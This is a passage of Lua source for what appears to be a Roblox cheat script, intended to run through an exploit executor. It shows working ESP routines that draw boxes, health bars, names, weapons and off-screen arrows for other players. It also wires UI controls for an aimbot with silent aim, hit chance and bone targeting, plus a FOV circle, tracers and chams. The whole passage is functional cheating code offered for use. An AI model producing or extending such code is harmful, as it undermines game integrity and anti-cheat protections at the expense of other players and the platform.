PA4oR5yxbscA6Pe84erkNEycJVg0o34Eu/t9qAuB85VGhqp74PL8Gp+E4zE8iVOXrEKRqJ9hLJp29c9Cf8BJwKU5+7dPjgAAAAASUVORK5CYII=")
                                else
                                    if vischeck then
                                        vischeck.Visible = false
                                    end
                                end
                        
                                if player.Character:FindFirstChild("Humanoid") then
                                    if player.Character.Humanoid.MoveDirection.Magnitude > 0 and table.find(Esp_Settings.Flags.Options, "Moving") then
                                        if not drawing2 then
                                            drawing2 = TE.Flags2
                                        end
                                        drawing2.Text = "MOVING"
                                        drawing2.Color = Color3.fromRGB(125, 125, 125)
                                        drawing2.Position = is_visible and (info.Points.TR + Vector2.new(23, 0)) or (info.Points.TR + Vector2.new(25, 0))
                                        drawing2.Visible = true
                                        drawing2.Size = Esp_Settings.Font_Size 
                                    else
                                        if drawing2 then
                                            drawing2.Visible = false
                                        end
                                    end
                                    
                                    local state = player.Character.Humanoid:GetState()
                                    if (state == Enum.HumanoidStateType.Jumping or state == Enum.HumanoidStateType.Freefall) and table.find(Esp_Settings.Flags.Options, "Jumping") then
                                        if not drawing3 then
                                            drawing3 = TE.Flags3
                                        end
                                        drawing3.Text = "JUMP"
                                        drawing3.Color = Color3.fromRGB(75, 75, 150)
                                        drawing3.Position = is_visible and (info.Points.TR + Vector2.new(18, 10)) or (info.Points.TR + Vector2.new(18, 10))
                                        drawing3.Visible = true
                                    else
                                        if drawing3 then
                                            drawing3.Visible = false
                                        end
                                    end
                                end
                            else
                                if vischeck then
                                    vischeck.Visible = false
                                end
                                if drawing2 then
                                    drawing2.Visible = false
                                end
                                if drawing3 then
                                    drawing3.Visible = false
                                end
                            end
                            if Library.flags["TeamCheck"] then
                                if not Functions:TeamCheck(player) then
                                    if vischeck then
                                        vischeck.Visible = false
                                    end
                                    if drawing2 then
                                        drawing2.Visible = false
                                    end
                                    if drawing3 then
                                        drawing3.Visible = false
                                    end
                                end
                            end
                        end      

                        local function HealthBarESP(settings, info)
                            local base, bar, bar2, text = HB.Base, HB.Health, HB.Health2, HB.Text
                            text.Visible, base.Visible, bar.Visible, bar2.Visible = settings.Enabled, settings.Enabled, false, false 
                            if (settings.Enabled) then
                                local bar_y = info.Offset.Y * 2
                                local hp = info.Humanoid.Health
                                local hp_perc = (hp / info.Humanoid.MaxHealth)
                        
                                if Esp_Settings.HealthBar.Enabled then
                                    if Esp_Settings.HealthBar.Options == "Pastel" then
                                        base.Size = Vector2.new(settings.Thickness, bar_y)
                                        base.Position = info.Points.TL + Vector2.new(-settings.Thickness - 2, 0)
                                        bar.Size = Vector2.new(settings.Thickness - 2, (bar_y - 2) * hp_perc)
                                        bar.Position = base.Position + Vector2.new(1, (bar_y - 1) - bar.Size.Y)
                                        bar.Color = settings.ColorEmpty:Lerp(Library.flags["Healthbar_Accent"], hp_perc)
                                        text.Position = bar.Position + Vector2.new(-text.TextBounds.X / 2 - 2, -text.TextBounds.Y / 2)
                                        bar.Visible = true 
                                        bar2.Visible = false 
                                    elseif Esp_Settings.HealthBar.Options == "Gradient" then
                                        base.Size = Vector2.new(settings.Thickness, bar_y)
                                        base.Position = info.Points.TL + Vector2.new(-settings.Thickness - 2, 0)
                                        bar2.Size = Vector2.new(settings.Thickness - 2, (bar_y - 2) * hp_perc)
                                        bar2.Data = gradient_healthbar
                                        bar2.Position = base.Position + Vector2.new(1, (bar_y - 1) - bar2.Size.Y)
                                        text.Position = bar2.Position + Vector2.new(-text.TextBounds.X / 2 - 2, -text.TextBounds.Y / 2)
                                        bar.Visible = false
                                        bar2.Visible = true 
                                    end
                                    --
                                    text.Text = tostring(math.round(hp))
                                    text.Color = Library.flags["HealthText_Accent"]
                                    text.Font = Esp_Settings.Font_Family
                                    text.Size = Esp_Settings.Font_Size
                            
                                    if Library.flags["TeamCheck"] and not Functions:TeamCheck(player) then
                                        ToggleTable('HealthBar', false)
                                        text.Visible, bar.Visible, bar2.Visible = false, false, false 
                                    else
                                        ToggleTable('HealthBar', settings.Enabled)
                                        text.Visible = Library.flags["HealthText"]
                                        if Esp_Settings.HealthBar.Options == "Pastel" then
                                            bar.Visible = true
                                            bar2.Visible = false
                                        elseif Esp_Settings.HealthBar.Options == "Gradient" then
                                            bar.Visible = false
                                            bar2.Visible = true
                                        end
                                    end
                                end
                            else
                                text.Visible, bar.Visible, bar2.Visible = false, false, false
                            end
                        end         

                        local function OffScreenArrowESP(settings, info)
                            if (settings.Enabled) then
                                local arrow = OSA.Arrow
                                local outline = OSA.Outline
    
                                arrow.Color = (Esp_Settings.Target.Enabled and Esp_Settings.Target.Player == player and Esp_Settings.Target.Color) or Library.flags["Arrows_Accent"]
                    
                                local proj = Camera.CFrame:PointToObjectSpace(info.Position)
                                local angle = math.atan2(proj.Z, proj.X)
                                local direction = Vector2.new(math.cos(angle), math.sin(angle))
                                local pos = (direction * settings.Radius / 2) + Camera.ViewportSize / 2
                                arrow.PointA = pos
                                arrow.PointB = pos - RotateVector2(direction, math.rad(35)) * settings.Size
                                arrow.PointC = pos - RotateVector2(direction, -math.rad(35)) * settings.Size
                    
                                if (settings.Outline) then
                                    outline.Visible = true
                                    outline.PointA = arrow.PointA
                                    outline.PointB = arrow.PointB
                                    outline.PointC = arrow.PointC
                                else
                                    outline.Visible = false
                                end
    
                                if Library.flags["TeamCheck"] then
                                    if not Functions:TeamCheck(player) then
                                        arrow.Visible = false
                                        outline.Visible = false
                                    else
                                        arrow.Visible = true
                                        outline.Visible = true
                                    end
                                else
                                    arrow.Visible = true
                                    outline.Visible = true
                                end
    
                                local arrow_info = {
                                    Offset = Vector2.new(settings.Size / 2, settings.Size / 2),
                                    Vector2 = pos - RotateVector2(direction, math.rad(0)) * (settings.Size / 2),
                                    Position = info.Position,Humanoid = info.Humanoid,Character = info.Character,
                                }
                                arrow_info.Points = CalculatePoints(arrow_info.Offset, arrow_info.Vector2)
                                if (settings.HPBars) then
                                    HealthBarESP(Esp_Settings.HealthBar, arrow_info)
                                end
                                if (settings.Name) then
                                    NameESP(Esp_Settings.Name, arrow_info)
                                end
                                if (settings.Box) then
                                    BoxESP(Esp_Settings.Box, arrow_info)
                                end
                                if (settings.Tool) then
                                    ToolESP(Esp_Settings.Tool, arrow_info)
                                end
                                if (settings.Distance) then
                                    DistanceESP(Esp_Settings.Distance, arrow_info)
                                end
                                if (settings.FilledBox) then
                                    FilledBoxESP(Esp_Settings.FilledBox, arrow_info)
                                end
                            end
                        end
                        -- Loop
                        local connection; connection = game.RunService.RenderStepped:Connect(function()
                            if (not player) then
                                DestroyDrawings()
                                connection:Disconnect()
                                return
                            end
                            local info = { Character = player.Character }
                            if not (Library.flags["ESP_Toggle"] and info.Character) then
                                HideDrawings()
                                HideChams(ESPChams)
                                return
                            end
                            info.Humanoid = info.Character:FindFirstChild('Humanoid')
                            info.RootPart = info.Character:FindFirstChild('HumanoidRootPart')
                            if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                                if LocalPlayer and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                                    local playerPosition = player.Character.HumanoidRootPart.Position
                                    local localPlayerPosition = LocalPlayer.Character.HumanoidRootPart.Position
                                    local distance = (playerPosition - localPlayerPosition).Magnitude / 3.5714285714
                                    if distance >= Library.flags["LimitESP_Distance"] then
                                        HideDrawings()
                                        HideChams(ESPChams)
                                        return
                                    end
                                end
                            end                                
                            if not (info.Humanoid and info.Humanoid.Health > 0 and info.RootPart) then
                                HideDrawings()
                                HideChams(ESPChams)
                                return
                            end         
                            local ignore_list = Functions:GetPlayerTool(info.Character)
                            if ignore_list == "Small Medkit" then
                                local small_med_kit = info.Character:FindFirstChild("Small Medkit")
                                if small_med_kit then
                                    small_med_kit:Destroy()
                                end
                            end
                            info.Orientation, info.Size, info.Position = Functions:GetBoundingBox(info.Character, ignore_list)
                            info.Vector2, info.OnScreen = Functions:WorldToViewport(info.Position)
                            if (not info.OnScreen) then
                                HideDrawings()
                                HideChams(ESPChams)
                                OffScreenArrowESP(Esp_Settings.OffScreenArrows, info)
                                return
                            end
                            info.Offset = CalculateOffset(info.Vector2, info.Position, info.Size)
                            info.Points = CalculatePoints(info.Offset, info.Vector2)
                            HealthBarESP(Esp_Settings.HealthBar, info)
                            flagsESP(Esp_Settings.Flags, info)
                            DistanceESP(Esp_Settings.Distance, info)
                            NameESP(Esp_Settings.Name, info)
                            ViewAngleESP(Esp_Settings.ViewAngle, info)
                            BoxESP(Esp_Settings.Box, info)
                            ToolESP(Esp_Settings.Tool, info)
                            FilledBoxESP(Esp_Settings.FilledBox, info)
                            ChamsESP(Esp_Settings.Chams, info)
                            ToggleTable('OffScreenArrows', false)
                        end)
                    end
                   

                ------------------------------------------------------------------------------------------------------------------------------------------------
                --> Combat -(Seperator)

                local drawings = {
                    fov_circle = {
                        enabled = false,
                        color = Color3.fromRGB(255, 255, 255),
                        outline = false,
                        dynamic = false,
                        thickness = 1.5,
                        radius = 120,
                        sides = 50,
                        animation_speed = 1,
                        circleTransparency = 1,
                        animated = "Static",
                        position = "Mouse"
                    },
                    crosshair = {
                        Enabled = false, 
                        Color = Color3.fromRGB(115, 100, 215), 
                        Arms = false,
                        Outline = false, 
                        Spin = false, 
                        Fade = false,
                        SpinSpeed = 100, 
                        Transparency = 1, 
                        Thickness = 1, 
                        Length = 12, 
                        Position = "Mouse",
                        Resize = false,
                        ResizeSpeed = 1,
                        ResizeMin = 8,
                        ResizeMax = 4,
                        SpinMax = 360,
                        SpinStyle = Enum.EasingStyle.Cubic,
                        FadeSpeed = 1,
                    },
                };
                local view_model = {
                    enabled = false,
                    position = Vector3.new(0, 0, 0) 
                }
    
                --
                local aimbot = {
                    enabled = false,
                    silent = false,
                    hitchance = 100,
                    autoprediction = true,
                    onscreen = false,
                    onscreen_position = "Camera",
                    randomisation = 0,
                    distance = 100,
                    snapline = false,
                    snapline_bone = "Head",
                    snapline_from = "Camera",
                    snapline_color = Color3.fromRGB(255,255,255),
                    teamcheck = false,
                    speed = 0.5,
                    bone = "Head"
                }
                local aim_tab = Tabs.Combat:createGroup('left', 'Aim')
                                            
                --// Aimbot
                do
                    aim_tab:addToggle({text = "Enabled",default = false,flag = "aimbot_enabled_toggle",callback = function(Value)
                        aimbot.enabled = Value
                    end}):addKeybind({text = "Aimbot",type = "hold",gui = true,key = Enum.UserInputType.MouseButton2,flag = "aim_toggle",callback = function(Value)
                    end})
    
                    aim_tab:addToggle({text = "Silent aim",default = false,risky = true,flag = "Silent_Enabled_Toggle",callback = function(state)
                        aimbot.silent = state
                    end}):addKeybind({text = "Silent",type = "hold",gui = true,key = Enum.UserInputType.MouseButton2,flag = "silent_aim_toggle",callback = function(Value)
                    end})
    
                    aim_tab:addSlider({text = "Hitchance:", min = 1, max = 100, suffix = "%", float = 1, default = 100, flag = "pSilent_Hitchance",callback = function(Value)
                        aimbot.hitchance = Value
                    end})
    
                    aim_tab:addSlider({text = "Limit Distance:", min = 0, max = 1000, suffix = "m", float = 10, default = 100, flag = "aim_distance_slider",callback = function(Value)
                        aimbot.distance = Value
                    end})
    
                    aim_tab:addSlider({text = "Smoothness:", min = 0, max = 100, suffix = "%", float = 1, default = 50, flag = "aim_smoothness_slider",callback = function(Value)
                        aimbot.speed = (100 - Value) / 100
                    end})
    
                    aim_tab:addToggle({text = "Auto Prediction",default = true,flag = "autoprediction_toggle",callback = function(Value)
                        aimbot.autoprediction = Value
                    end})
    
                    aim_tab:addToggle({text = "Snaplines",default = false,flag = "aim_snaplines_toggle",callback = function(Value)
                        aimbot.snapline = Value
                        Snapline.Visible = Value
                    end}):addColorpicker({text = "snaplines color",ontop = true,flag = "aim_snaplines_accent",color = Color3.fromRGB(255, 255, 255),callback = function(Value)
                        Snapline.Color = Value
                    end})
    
                    aim_tab:addList({text = "Snapline from:",multiselect = false,values = {'Camera','Mouse','Barrel'},flag = "snapline_position_options",callback = function(Value)
                        aimbot.snapline_from = Value   
                    end})
    
                    aim_tab:addList({text = "Snapline bone:",multiselect = false,values = {'Head','UpperTorso','LowerTorso','LeftUpperArm','LeftLowerArm','RightUpperArm','RightLowerArm','LeftHand','RightHand','LeftUpperLeg','LeftLowerLeg','LeftFoot','RightUpperLeg','RightLowerLeg','RightFoot'},flag = "Snapline_Bone",callback = function(Value)
                        aimbot.snapline_bone = Value
                    end})
    
                    aim_tab:addToggle({text = "Visible Check",default = false,flag = "aim_visibleheck_toggle",callback = function(Value)
                    end})
    
                    aim_tab:addToggle({text = "Team Check",default = false,flag = "aim_teamcheck_toggle",callback = function(Value)
                        aimbot.teamcheck = Value
                    end})
    
                    aim_tab:addSlider({text = "Shake:", min = 0, max = 100, suffix = "%", float = 1, default = 0, flag = "aim_randomisation_slider",callback = function(Value)
                        aimbot.randomisation = Value
                    end})
    
                    aim_tab:addToggle({text = "Highlight Target",default = false,flag = "highlighttarget_toggle",callback = function(Value)
                        Esp_Settings.Target.Enabled = Value
                    end}):addColorpicker({text = "highlight target color",ontop = true,flag = "highlighttarget_accent",color = Color3.fromRGB(255, 50, 50),callback = function(Value)
                        Esp_Settings.Target.Color = Value
                    end})
    
                    aim_tab:addList({text = "Bone:",multiselect = false,values = {'Head','UpperTorso','LowerTorso','LeftUpperArm','LeftLowerArm','RightUpperArm','RightLowerArm','LeftHand','RightHand','LeftUpperLeg','LeftLowerLeg','LeftFoot','RightUpperLeg','RightLowerLeg','RightFoot'},flag = "aimb_options",callback = function(Value)
                        aimbot.bone = Value
                    end})
                end
    
                --
                local inflict_target = {
                    hit = {
                        tracers = {
                            enabled = false,
                            style = "Color Lerp",
                            lifetime = 2.5,
                            color = Color3.fromRGB(255, 255, 255),
                        },
                        hitmarkers = {
                            enabled = false,
                            lifetime = 2.5,
                            color = Color3.fromRGB(255, 255, 255)
                        },
                    },
                }
                local Hit_Tab = Tabs.Combat:createGroup('center', 'Hit')
            
                do --// Hit tab
                    Hit_Tab:addToggle({text = "Bullet Tracers",default = false,flag = "Bullet_Tracers_Toggle",callback = function(state)
                        inflict_target.hit.tracers.enabled = state
                    end}):addColorpicker({text = "Bullet tracers color",ontop = true,flag = "Bullet_Tracers_Accent",color = inflict_target.hit.tracers.color,callback = function(state)
                        inflict_target.hit.tracers.color = state
                    end})
    
                    Hit_Tab:addList({text = "Style:",multiselect = false,values = {"Color Lerp","Laser","Custom"},flag = "Bullet_Tracer_Style",callback = function(state)
                        inflict_target.hit.tracers.style = state   
                    end})
    
                    Hit_Tab:addSlider({text = "Lifetime:", min = 1, max = 5, suffix = "s", float = 0.1, default = inflict_target.hit.tracers.lifetime, flag = "Bullet_Tracers_Slider",callback = function(state)
                        inflict_target.hit.tracers.lifetime = state
                    end})
    
                    Hit_Tab:addToggle({text = "Hitmarkers",default = false,flag = "Hitmarkers_Toggle",callback = function(state)
                        inflict_target.hit.hitmarkers.enabled = state
                    end}):addColorpicker({text = "Hitmarkers color",ontop = true,flag = "Hitmarkers_Accent",color = inflict_target.hit.hitmarkers.color,callback = function(state)
                        inflict_target.hit.hitmarkers.color = state
                    end})
    
                    Hit_Tab:addSlider({text = "Lifetime:", min = 1, max = 5, suffix = "s", float = 0.1, default = inflict_target.hit.hitmarkers.lifetime, flag = "Hitmarkerslifetime_Slider",callback = function(state)
                        inflict_target.hit.hitmarkers.lifetime = state
                    end})
                end
    
                --
                local FovCircle_Tab = Tabs.Combat:createGroup('right', 'Fov Circle')
    
                do --// Fov Circle
                    FovCircle_Tab:addToggle({text = "Enabled",default = false,flag = "fovcircle_enabled_toggle",callback = function(Value)
                        drawings.fov_circle.enabled = Value
                    end}):addColorpicker({text = "fov color",ontop = true,flag = "fov_accent",color = Color3.fromRGB(115, 100, 215),callback = function(Value)
                        drawings.fov_circle.color = Value
                    end})
    
                    FovCircle_Tab:addToggle({text = "Dynamic",default = false,flag = "fovcircle_dynamic_toggle",callback = function(Value)
                        drawings.fov_circle.dynamic = Value
                    end})
    
                    FovCircle_Tab:addToggle({text = "Outline",default = false,flag = "fovcircle_outline_toggle",callback = function(Value)
                        drawings.fov_circle.outline = Value
                    end})
    
                    FovCircle_Tab:addSlider({text = "Radius:", min = 0, max = 750, suffix = "px", float = 1, default = 120, flag = "fovcircle_radius_slider",callback = function(Value)
                        drawings.fov_circle.radius = Value
                    end})
    
                    FovCircle_Tab:addSlider({text = "Thickness:", min = 1, max = 3, suffix = "", float = 0.1, default = 1.5, flag = "FovCircle_Thickness_sSlider",callback = function(Value)
                        drawings.fov_circle.thickness = Value
                    end})
    
                    FovCircle_Tab:addSlider({text = "Rotation speed:", min = 0.1, max = 3, suffix = "s", float = 0.1, default = 1.5, flag = "animation_speed_slider",callback = function(Value)
                        drawings.fov_circle.animation_speed = Value
                    end})
    
                    FovCircle_Tab:addSlider({text = "Transparency:", min = 0, max = 100, suffix = "%", float = 1, default = 100, flag = "fovcircle_transparency_slider",callback = function(Value)
                        drawings.fov_circle.circleTransparency = Value / 100
                    end})
    
                    FovCircle_Tab:addList({text = "Animation:",multiselect = false,values = {'Static','Rainbow','Animated'},flag = "fov_animation",callback = function(state)
                        drawings.fov_circle.animated = state
                    end})
    
                    FovCircle_Tab:addList({text = "Position:",multiselect = false,values = {'Camera','Mouse','Barrel'},flag = "fov_position_options",callback = function(Value)
                        drawings.fov_circle.position = Value   
                    end})
                end

                ------------------------------------------------------------------------------------------------------------------------------------------------
                --> Visuals -(Seperator)

                --
                local esp_visualstab = Tabs.Visuals:createGroup('left', 'ESP')
                    
                do --// Visuals
                    esp_visualstab:addToggle({text = "Enabled",default = false,flag = "ESP_Toggle",callback = function(Value) end})
                    esp_visualstab:addSlider({text = "Limit distance:", min = 0, max = 1000, suffix = "m", float = 10, default = 100, flag = "LimitESP_Distance",callback = function(Value) end})
                    esp_visualstab:addToggle({text = "Names",default = false,flag = "Names",callback = function(Value) Esp_Settings.Name.Enabled = Value end}):addColorpicker({text = "Names Color",ontop = true,flag = "Names_Accent",color = Color3.fromRGB(255, 255, 255),callback = function(Value) end})
                    esp_visualstab:addToggle({text = "Boxes",default = false,flag = "Boxes",callback = function(Value) Esp_Settings.Box.Enabled = Value end}):addColorpicker({text = "Boxes Color",ontop = true,flag = "Boxes_Accent",color = Color3.fromRGB(255, 255, 255),callback = function(Value) end})
                    esp_visualstab:addList({text = "Box selection:",multiselect = false,values = {'full','corner'},flag = "Boxes_Selection",callback = function(Value) Esp_Settings.Box.Type = Value end})
                    esp_visualstab:addToggle({text = "Distance",default = false,flag = "Distance",callback = function(Value) Esp_Settings.Distance.Enabled = Value end}):addColorpicker({text = "Distance Color",ontop = true,flag = "Distance_Accent",color = Color3.fromRGB(255, 255, 255),callback = function(Value) end})
                    esp_visualstab:addToggle({text = "Chams",default = false,flag = "Chams",callback = function(Value) Esp_Settings.Chams.Enabled = Value end}):addColorpicker({text = "Chams Color",ontop = true,flag = "ChamsFill_Accent",color = Color3.fromRGB(115, 100, 215),callback = function(Value) end})
                    esp_visualstab:addList({text = "Chams selection:",multiselect = true,values = {'static', 'breathe', 'visible'},flag = "Chams_Selection",callback = function(selected_states) Esp_Settings.Chams.Breathe = false Esp_Settings.Chams.VisibleCheck = false for _, state in ipairs(selected_states) do if state == "static" then Esp_Settings.Chams.Breathe = false elseif state == "breathe" then Esp_Settings.Chams.Breathe = true elseif state == "visible" then Esp_Settings.Chams.VisibleCheck = true end end end})
                    esp_visualstab:addSlider({text = "Fill transparency:", min = 0, max = 100, suffix = "%", float = 1, default = 85, flag = "FillChams",callback = function(Value) end})
                    esp_visualstab:addToggle({text = "Healthbar",default = false,flag = "Healthbar",callback = function(Value) Esp_Settings.HealthBar.Enabled = Value end}):addColorpicker({text = "Healthbar Color",ontop = true,flag = "Healthbar_Accent",color = Color3.fromRGB(115, 100, 215),callback = function(Value) end})
                    esp_visualstab:addList({text = "Healthbar options:",multiselect = false,values = {"Pastel", "Gradient"},flag = "Healthbar_Options",callback = function(state) Esp_Settings.HealthBar.Options = state end})       
                    esp_visualstab:addToggle({text = "Health text",default = false,flag = "HealthText",callback = function(Value) end}):addColorpicker({text = "Health Text",ontop = true,flag = "HealthText_Accent",color = Color3.fromRGB(115, 100, 215),callback = function(Value) end})
                    esp_visualstab:addToggle({text = "Weapon",default = false,flag = "Weapon",callback = function(Value) Esp_Settings.Tool.Enabled = Value end}):addColorpicker({text = "Weapon Color",ontop = true,flag = "Weapon_Accent",color = Color3.fromRGB(255, 255, 255),callback = function(Value) end})
                    esp_visualstab:addToggle({text = "weapon icon",default = false,flag = "WeaponIcon",callback = function(Value) end}):addColorpicker({text = "Weapon Icon Color",ontop = true,flag = "Weapon_Icon_Accent",color = Color3.fromRGB(115, 100, 215),callback = function(Value) end})
                    esp_visualstab:addToggle({text = "View Angle",default = false,flag = "ViewAngle",callback = function(Value) Esp_Settings.ViewAngle.Enabled = Value end}):addColorpicker({text = "View Angle Color",ontop = true,flag = "ViewAngle_Accent",color = Color3.fromRGB(255, 255, 255),callback = function(Value) end})
                    esp_visualstab:addToggle({text = "Flags",default = false,flag = "Flags",callback = function(Value) Esp_Settings.Flags.Enabled = Value end})
                    esp_visualstab:addList({text = "Flags options:",multiselect = true,values = {"Visible", "Moving", "Jumping"},flag = "flags_list",callback = function(state) Esp_Settings.Flags.Options = state end})                                      
                    esp_visualstab:addToggle({text = "Arrows",default = false,flag = "Arrows",callback = function(Value) Esp_Settings.OffScreenArrows.Enabled = Value end}):addColorpicker({text = "Arrow color",ontop = true,flag = "Arrows_Accent",color = Color3.fromRGB(115, 100, 215),callback = function(Value) Esp_Settings.OffScreenArrows.Color = Value end})
                    esp_visualstab:addList({text = "Arrow options:",multiselect = true,values = {'health','distance','tool','names','boxes'},flag = "arrows_list",callback = function(selectedValues) Esp_Settings.OffScreenArrows.HPBars = false Esp_Settings.OffScreenArrows.Distance = false Esp_Settings.OffScreenArrows.Tool = false Esp_Settings.OffScreenArrows.Name = false Esp_Settings.OffScreenArrows.Box = false for _, value in ipairs(selectedValues) do if value == 'health' then Esp_Settings.OffScreenArrows.HPBars = true elseif value == 'distance' then Esp_Settings.OffScreenArrows.Distance = true elseif value == 'tool' then Esp_Settings.OffScreenArrows.Tool = true elseif value == 'names' then Esp_Settings.OffScreenArrows.Name = true elseif value == 'boxes' then Esp_Settings.OffScreenArrows.Box = true end end end})                        
                end

                --
                local esp_settingstab = Tabs.Visuals:createGroup('right', 'Settings')
                    
                do --// Settings
                    esp_settingstab:addToggle({text = "Display names",default = true,flag = "DisplayNames",callback = function(Value) end})
                    esp_settingstab:addToggle({text = "Team check",default = false,flag = "TeamCheck",callback = function(state) end}):addColorpicker({text = "team check color",ontop = true,flag = "TeamCheck_Accent",color = Color3.fromRGB(0, 255, 0),callback = function(Value) end})
                    esp_settingstab:addToggle({text = "Outlines",default = true,flag = "ESPOutlines",callback = function(Value) Esp_Settings.OffScreenArrows.Outline = Value Esp_Settings.ViewAngle.Outline = Value Esp_Settings.Box.Outline = Value end})
                    esp_settingstab:addToggle({text = "Filled boxes",default = false,flag = "FilledBox",callback = function(Value) Esp_Settings.FilledBox.Enabled = Value end}):addColorpicker({text = "Filled Box Color",ontop = true,flag = "FilledBox_Accent",color = Color3.fromRGB(0, 0, 0),callback = function(Value) end})
                    esp_settingstab:addSlider({text = "Filled transparency:", min = 0, max = 100, suffix = "%", float = 1, default = 30, flag = "BoxFilled_Transparency",callback = function(Value) Esp_Settings.FilledBox.Transparency = Value end})
                    esp_settingstab:addSlider({text = "View angle size:", min = 1, max = 25, suffix = "px", float = 1, default = 5, flag = "ViewAngle_Size",callback = function(Value) end})
                    esp_settingstab:addSlider({text = "Arrow size:", min = 1, max = 100, suffix = "px", float = 1, default = 15, flag = "ArrowSize",callback = function(Value) Esp_Settings.OffScreenArrows.Size = Value end})
                    esp_settingstab:addSlider({text = "Arrow radius:", min = 1, max = 750, suffix = "o", float = 1, default = 150, flag = "ArrowRadius",callback = function(Value) Esp_Settings.OffScreenArrows.Radius = Value end})
                    esp_settingstab:addSlider({text = "Healthbar size:", min = 3, max = 5, suffix = "%", float = 0.1, default = 3, flag = "HealthbarSize",callback = function(Value) Esp_Settings.HealthBar.Thickness = Value end})
                    esp_settingstab:addSlider({text = "Font size:", min = 1, max = 25, suffix = "px", float = 1, default = 12, flag = "FontSize",callback = function(Value) Esp_Settings.Font_Size = Value end})
                    esp_settingstab:addList({text = "Onscreen from:",multiselect = false,values = {'Camera', 'Barrel', 'Mouse'},flag = "OnscreenFrom",callback = function(state) end})
                end
                --
                local crosshair_tab = Tabs.Visuals:createGroup('center', 'Crosshair')

                do --// Crosshair
                    crosshair_tab:addToggle({text = "Enabled",default = false,flag = "Enabled_Crosshair_Toggle",callback = function(state)
                        drawings.crosshair.Enabled = state
                    end}):addColorpicker({text = "Crosshair Color",ontop = true,flag = "Crosshair_Accent",color = Color3.fromRGB(115, 100, 215),callback = function(state)
                        drawings.crosshair.Color = state
                    end})

                    crosshair_tab:addToggle({text = "Outline",default = true,flag = "Enabled_Outline_Crosshair_Toggle",callback = function(state)
                        drawings.crosshair.Outline = state
                    end})

                    crosshair_tab:addToggle({text = "Arms",default = false,flag = "Enabled_Arms_Crosshair_Toggle",callback = function(state)
                        drawings.crosshair.Arms = state
                    end})

                    crosshair_tab:addToggle({text = "Spin",default = false,flag = "Enabled_Spin_Crosshair_Toggle",callback = function(state)
                        drawings.crosshair.Spin = state
                    end})

                    crosshair_tab:addToggle({text = "Resize",default = false,flag = "Enabled_Resize_Crosshair_Toggle",callback = function(state)
                        drawings.crosshair.Resize = state
                    end})

                    crosshair_tab:addToggle({text = "Fade",default = false,flag = "Enabled_Fade_Crosshair_Toggle",callback = function(state)
                        drawings.crosshair.Fade = state
                    end})

                    crosshair_tab:addSlider({text = "Length:", min = 1, max = 25, suffix = "px", float = 1, default = 6, flag = "Crosshair_Size_Slider",callback = function(state)
                        drawings.crosshair.Length = state
                    end})

                    crosshair_tab:addSlider({text = "Width:", min = 0, max = 3, suffix = "px", float = 1, default = 1, flag = "Crosshair_Thickness_Slider",callback = function(state)
                        drawings.crosshair.Thickness = state
                    end})

                    crosshair_tab:addSlider({text = "Transparency:", min = 0, max = 100, suffix = "%", float = 1, default = 100, flag = "Crosshair_Transparency_Slider",callback = function(state)
                        drawings.crosshair.Transparency = state / 100
                    end})

                    crosshair_tab:addSlider({text = "Speed:", min = 25, max = 250, suffix = "x", float = 1, default = 100, flag = "Crosshair_Speed_Slider",callback = function(state)
                        drawings.crosshair.SpinSpeed = state
                    end})

                    crosshair_tab:addSlider({text = "Resize speed:", min = 1, max = 5, suffix = "x", float = 0.1, default = 1, flag = "Crosshair_Resize_Speed_Slider",callback = function(state)
                        drawings.crosshair.ResizeSpeed = state
                    end})

                    crosshair_tab:addSlider({text = "Resize minimum:", min = 1, max = 25, suffix = "px", float = 1, default = 6, flag = "Crosshair_Resize_minimum_Slider",callback = function(state)
                        drawings.crosshair.ResizeMin = state
                    end})

                    crosshair_tab:addSlider({text = "Resize maximum:", min = 1, max = 25, suffix = "px", float = 1, default = 8, flag = "Crosshair_Resize_maximum_Slider",callback = function(state)
                        drawings.crosshair.ResizeMax = state
                    end})

                    crosshair_tab:addSlider({text = "Fade time:", min = 1, max = 3, suffix = "s", float = 0.1, default = 1, flag = "Crosshair_Fade_Slider",callback = function(state)
                        drawings.crosshair.FadeSpeed = state
                    end})

                    crosshair_tab:addList({text = "Spin style:",multiselect = false,values = {"Linear", "Sine", "Cubic", "Exponential", "Circular", "Back", "Elastic", "Bounce"},flag = "Crosshair_Spin_Style",callback = function(state)
                        local easingStyles = {
                            Linear = Enum.EasingStyle.Linear,Sine = Enum.EasingStyle.Sine,Cubic = Enum.EasingStyle.Cubic,Exponential = Enum.EasingStyle.Exponential,Circular = Enum.EasingStyle.Circular,Back = Enum.EasingStyle.Back,Elastic = Enum.EasingStyle.Elastic,Bounce = Enum.EasingStyle.Bounce
                        }
                        drawings.crosshair.SpinStyle = easingStyles[state]
                    end})                    

                    crosshair_tab:addList({text = "Position:",multiselect = false,values = {"Camera", "Mouse", "Barrel"},flag = "Crosshair_Options",callback = function(state)
                        drawings.crosshair.Position = state
                    end})
                end 

                ------------------------------------------------------------------------------------------------------------------------------------------------
                --> Local -(Seperator)

                --
                local settings = {
                    local_chams = {
                        enabled = false,
                        transparency = 1,
                        material = "ForceField",
                        textures = "",
                        color = Color3.fromRGB(255, 255, 255)
                    },
                    weapon_chams = {
                        enabled = false,
                        transparency = 1,
                        material = "ForceField",
                        textures = "",
                        color = Color3.fromRGB(255, 255, 255)
                    },
                    highlight_settings = {
                        enabled = false,
                        highlight_color = Color3.fromRGB(115, 100, 215),
                        outline_color = Color3.fromRGB(0, 0, 0),
                        fill_transparency = 1,
                        outline_transparency = 0
                    }
                }
                local texture_animations = {
                    Galaxy = "rbxassetid://9305457875",
                    Magma = "rbxassetid://4512463057",
                    Stars = "rbxassetid://13716498524",
                    Wave = "rbxassetid://238315118",
                    Electric = "rbxassetid://259082047",
                    Hexagon = "rbxassetid://78979194",
                    ["Spider Web"] = "rbxassetid://14019230164",
                    Pixels = "rbxassetid://11780157037",
                    Pulse = "rbxassetid://12258978369",
                }
                local local_chams_tab = Tabs.Local:createGroup('left', 'Self Chams')

                --// Self Chams
                do
                    local_chams_tab:addToggle({text = "Arms",default = false,flag = "local_chams_toggle",callback = function(state)
                        settings.local_chams.enabled = state
                    end}):addColorpicker({text = "local chams color",ontop = true,flag = "local_chams_accent",color = settings.local_chams.color,callback = function(state)
                        settings.local_chams.color = state
                    end})

                    local_chams_tab:addSlider({text = "Transparency:", min = 0, max = 100, suffix = "%", float = 1, default = 0, flag = "local_transparency_slider",callback = function(state)
                        settings.local_chams.transparency = state / 100
                    end})

